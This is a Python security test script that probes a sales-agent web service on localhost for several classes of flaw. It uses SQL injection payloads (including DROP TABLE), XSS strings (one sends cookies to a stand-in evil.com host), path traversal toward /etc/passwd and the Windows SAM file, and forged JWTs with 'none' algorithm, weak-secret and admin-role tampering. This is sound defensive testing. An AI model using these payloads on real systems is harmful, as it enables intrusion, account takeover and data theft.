#!/usr/bin/env python3
"""
Security Penetration Tests for NGX Voice Sales Agent.
Tests various attack vectors to ensure system security.
"""

import asyncio
import aiohttp
import time
import json
import jwt
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Any


class SecurityPenetrationTester:
    """Security testing for various attack vectors."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.vulnerabilities = []
        self.test_results = []
        
    async def test_sql_injection(self, session: aiohttp.ClientSession):
        """Test SQL injection vulnerabilities."""
        print("\n🔍 SQL INJECTION TESTS")
        print("-" * 50)
        
        sql_payloads = [
            "'; DROP TABLE conversations; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "1' AND SLEEP(5)--",
            "' OR 1=1--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT password FROM users WHERE username='admin'--"
        ]
        
        results = []
        
        for payload in sql_payloads:
            print(f"Testing payload: {payload[:30]}...")
            
            try:
                # Test in customer data
                test_data = {
                    "customer_data": {
                        "id": payload,
                        "name": f"Test {payload}",
                        "email": f"{payload}@test.com",
                        "age": 30
                    }
                }
                
                start_time = time.time()
                async with session.post(
                    f"{self.base_url}/conversations/start",
                    json=test_data,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    elapsed = time.time() - start_time
                    result = {
                        "payload": payload,
                        "field": "customer_data",
                        "status_code": response.status,
                        "response_time": elapsed,
                        "vulnerable": False
                    }
                    
                    # Check for SQL error messages
                    text = await response.text()
                    sql_errors = ["syntax error", "mysql", "postgresql", "sqlite", "sql"]
                    if any(error in text.lower() for error in sql_errors):
                        result["vulnerable"] = True
                        result["error_disclosed"] = True
                        self.vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "details": f"SQL error disclosed with payload: {payload}"
                        })
                    
                    # Check for delayed response (time-based injection)
                    if elapsed > 4:  # SLEEP(5) would cause delay
                        result["vulnerable"] = True
                        result["time_based"] = True
                        self.vulnerabilities.append({
                            "type": "Time-based SQL Injection",
                            "severity": "CRITICAL",
                            "details": f"Delayed response with payload: {payload}"
                        })
                    
                    results.append(result)
                    
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e),
                    "vulnerable": "error" in str(e).lower()
                })
        
        self._print_test_results("SQL Injection", results)
        return results
    
    async def test_xss_attacks(self, session: aiohttp.ClientSession):
        """Test Cross-Site Scripting vulnerabilities."""
        print("\n🔍 XSS (Cross-Site Scripting) TESTS")
        print("-" * 50)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.cookie</script>",
            "<img src='x' onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        results = []
        
        # Start a conversation first
        start_response = await session.post(
            f"{self.base_url}/conversations/start",
            json={
                "customer_data": {
                    "id": "xss-test",
                    "name": "XSS Tester",
                    "email": "xss@test.com",
                    "age": 30
                }
            }
        )
        conv_data = await start_response.json()
        conversation_id = conv_data.get("conversation_id")
        
        for payload in xss_payloads:
            print(f"Testing XSS payload: {payload[:30]}...")
            
            try:
                # Test in message
                async with session.post(
                    f"{self.base_url}/conversations/{conversation_id}/message",
                    json={"message": payload},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    result = {
                        "payload": payload,
                        "field": "message",
                        "status_code": response.status,
                        "vulnerable": False
                    }
                    
                    response_data = await response.json()
                    response_text = json.dumps(response_data)
                    
                    # Check if payload is reflected without encoding
                    if payload in response_text:
                        result["vulnerable"] = True
                        result["reflected"] = True
                        self.vulnerabilities.append({
                            "type": "Reflected XSS",
                            "severity": "HIGH",
                            "details": f"Unencoded payload in response: {payload}"
                        })
                    
                    # Check for partial encoding issues
                    dangerous_patterns = ["<script", "onerror=", "javascript:", "onload="]
                    for pattern in dangerous_patterns:
                        if pattern in response_text.lower():
                            result["vulnerable"] = True
                            result["partial_encoding"] = True
                            self.vulnerabilities.append({
                                "type": "XSS - Partial Encoding",
                                "severity": "MEDIUM",
                                "details": f"Dangerous pattern found: {pattern}"
                            })
                            break
                    
                    results.append(result)
                    
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)
                })
        
        self._print_test_results("XSS", results)
        return results
    
    async def test_jwt_manipulation(self, session: aiohttp.ClientSession):
        """Test JWT token manipulation vulnerabilities."""
        print("\n🔍 JWT MANIPULATION TESTS")
        print("-" * 50)
        
        results = []
        
        # First, get a valid token
        login_response = await session.post(
            f"{self.base_url}/auth/login",
            json={
                "username": "test@example.com",
                "password": "testpassword"
            }
        )
        
        if login_response.status != 200:
            print("⚠️  Could not obtain valid JWT for testing")
            return results
        
        auth_data = await login_response.json()
        valid_token = auth_data.get("access_token", "")
        
        # Test various JWT attacks
        jwt_tests = [
            {
                "name": "None Algorithm",
                "token": self._create_none_algorithm_token(),
                "description": "JWT with 'none' algorithm"
            },
            {
                "name": "Weak Secret",
                "token": self._create_weak_secret_token(),
                "description": "JWT signed with common secret"
            },
            {
                "name": "Expired Token",
                "token": self._create_expired_token(),
                "description": "JWT with past expiration"
            },
            {
                "name": "Tampered Payload",
                "token": self._tamper_token(valid_token),
                "description": "Modified JWT payload"
            },
            {
                "name": "Missing Signature",
                "token": valid_token.rsplit('.', 1)[0] + ".",
                "description": "JWT without signature"
            }
        ]
        
        for test in jwt_tests:
            print(f"Testing: {test['name']} - {test['description']}")
            
            try:
                headers = {"Authorization": f"Bearer {test['token']}"}
                
                async with session.get(
                    f"{self.base_url}/conversations/list",
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    result = {
                        "test": test["name"],
                        "status_code": response.status,
                        "vulnerable": False
                    }
                    
                    if response.status == 200:
                        result["vulnerable"] = True
                        self.vulnerabilities.append({
                            "type": "JWT Vulnerability",
                            "severity": "CRITICAL",
                            "details": f"{test['name']}: {test['description']}"
                        })
                    
                    results.append(result)
                    
            except Exception as e:
                results.append({
                    "test": test["name"],
                    "error": str(e)
                })
        
        self._print_test_results("JWT Manipulation", results)
        return results
    
    async def test_rate_limiting(self, session: aiohttp.ClientSession):
        """Test rate limiting effectiveness."""
        print("\n🔍 RATE LIMITING TESTS")
        print("-" * 50)
        
        # Test rapid requests
        print("Testing rapid fire requests...")
        
        request_count = 150  # Should exceed rate limit
        results = []
        start_time = time.time()
        
        for i in range(request_count):
            try:
                async with session.get(
                    f"{self.base_url}/health",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    results.append({
                        "request": i + 1,
                        "status": response.status,
                        "timestamp": time.time() - start_time
                    })
                    
                    if response.status == 429:  # Too Many Requests
                        print(f"✅ Rate limit triggered at request {i + 1}")
                        break
                        
            except Exception as e:
                results.append({
                    "request": i + 1,
                    "error": str(e)
                })
        
        # Analyze results
        blocked_requests = sum(1 for r in results if r.get("status") == 429)
        
        if blocked_requests == 0 and len(results) >= 100:
            self.vulnerabilities.append({
                "type": "Missing Rate Limiting",
                "severity": "HIGH",
                "details": f"No rate limiting detected after {len(results)} requests"
            })
        
        self._print_test_results("Rate Limiting", [{
            "total_requests": len(results),
            "blocked_requests": blocked_requests,
            "rate_limit_effective": blocked_requests > 0
        }])
        
        return results
    
    async def test_path_traversal(self, session: aiohttp.ClientSession):
        """Test path traversal vulnerabilities."""
        print("\n🔍 PATH TRAVERSAL TESTS")
        print("-" * 50)
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        results = []
        
        for payload in traversal_payloads:
            print(f"Testing payload: {payload}")
            
            try:
                # Test in file parameter if any endpoint accepts files
                async with session.get(
                    f"{self.base_url}/files/{payload}",
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    result = {
                        "payload": payload,
                        "status_code": response.status,
                        "vulnerable": False
                    }
                    
                    if response.status == 200:
                        text = await response.text()
                        # Check for system file contents
                        if any(keyword in text for keyword in ["root:", "Users", "Windows"]):
                            result["vulnerable"] = True
                            self.vulnerabilities.append({
                                "type": "Path Traversal",
                                "severity": "CRITICAL",
                                "details": f"System file accessed: {payload}"
                            })
                    
                    results.append(result)
                    
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)
                })
        
        self._print_test_results("Path Traversal", results)
        return results
    
    def _create_none_algorithm_token(self) -> str:
        """Create JWT with 'none' algorithm."""
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "sub": "admin",
            "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp())
        }
        
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        
        return f"{header_encoded}.{payload_encoded}."
    
    def _create_weak_secret_token(self) -> str:
        """Create JWT with weak secret."""
        return jwt.encode(
            {"sub": "admin", "exp": datetime.utcnow() + timedelta(hours=1)},
            "secret",  # Common weak secret
            algorithm="HS256"
        )
    
    def _create_expired_token(self) -> str:
        """Create expired JWT."""
        return jwt.encode(
            {"sub": "admin", "exp": datetime.utcnow() - timedelta(hours=1)},
            "some-secret",
            algorithm="HS256"
        )
    
    def _tamper_token(self, valid_token: str) -> str:
        """Tamper with valid token payload."""
        parts = valid_token.split('.')
        if len(parts) != 3:
            return valid_token
        
        # Decode payload
        payload = json.loads(
            base64.urlsafe_b64decode(parts[1] + "==").decode()
        )
        
        # Modify payload
        payload["role"] = "admin"
        payload["permissions"] = ["all"]
        
        # Re-encode
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        
        return f"{parts[0]}.{new_payload}.{parts[2]}"
    
    def _print_test_results(self, test_name: str, results: List[Dict]):
        """Print test results summary."""
        vulnerable_count = sum(1 for r in results if r.get("vulnerable", False))
        
        print(f"\n{test_name} Results:")
        print(f"Total tests: {len(results)}")
        print(f"Vulnerabilities found: {vulnerable_count}")
        
        if vulnerable_count > 0:
            print("⚠️  VULNERABILITIES DETECTED!")
        else:
            print("✅ No vulnerabilities found")
    
    async def run_all_tests(self):
        """Run all security tests."""
        async with aiohttp.ClientSession() as session:
            await self.test_sql_injection(session)
            await self.test_xss_attacks(session)
            await self.test_jwt_manipulation(session)
            await self.test_rate_limiting(session)
            await self.test_path_traversal(session)
        
        # Print final report
        self._print_final_report()
    
    def _print_final_report(self):
        """Print comprehensive security report."""
        print("\n" + "=" * 60)
        print("🔒 SECURITY PENETRATION TEST REPORT")
        print("=" * 60)
        
        if not self.vulnerabilities:
            print("\n✅ EXCELLENT! No vulnerabilities detected.")
            print("The system appears to be well-protected against common attacks.")
        else:
            print(f"\n⚠️  WARNING: {len(self.vulnerabilities)} vulnerabilities found!")
            
            # Group by severity
            critical = [v for v in self.vulnerabilities if v["severity"] == "CRITICAL"]
            high = [v for v in self.vulnerabilities if v["severity"] == "HIGH"]
            medium = [v for v in self.vulnerabilities if v["severity"] == "MEDIUM"]
            
            if critical:
                print(f"\n🔴 CRITICAL ({len(critical)}):")
                for vuln in critical:
                    print(f"  - {vuln['type']}: {vuln['details']}")
            
            if high:
                print(f"\n🟠 HIGH ({len(high)}):")
                for vuln in high:
                    print(f"  - {vuln['type']}: {vuln['details']}")
            
            if medium:
                print(f"\n🟡 MEDIUM ({len(medium)}):")
                for vuln in medium:
                    print(f"  - {vuln['type']}: {vuln['details']}")
        
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"tests/security/results/penetration_test_{timestamp}.json"
        
        import os
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, "w") as f:
            json.dump({
                "test_type": "security_penetration",
                "timestamp": timestamp,
                "total_vulnerabilities": len(self.vulnerabilities),
                "vulnerabilities": self.vulnerabilities,
                "summary": {
                    "critical": len([v for v in self.vulnerabilities if v["severity"] == "CRITICAL"]),
                    "high": len([v for v in self.vulnerabilities if v["severity"] == "HIGH"]),
                    "medium": len([v for v in self.vulnerabilities if v["severity"] == "MEDIUM"])
                }
            }, f, indent=2)
        
        print(f"\n💾 Full report saved to: {filename}")


async def main():
    """Run security penetration tests."""
    print("🔒 NGX Voice Sales Agent - SECURITY PENETRATION TESTS")
    print("=" * 60)
    print("⚠️  WARNING: These tests attempt real attacks.")
    print("Only run against systems you own or have permission to test.")
    print("=" * 60)
    
    tester = SecurityPenetrationTester()
    await tester.run_all_tests()


if __name__ == "__main__":
    asyncio.run(main())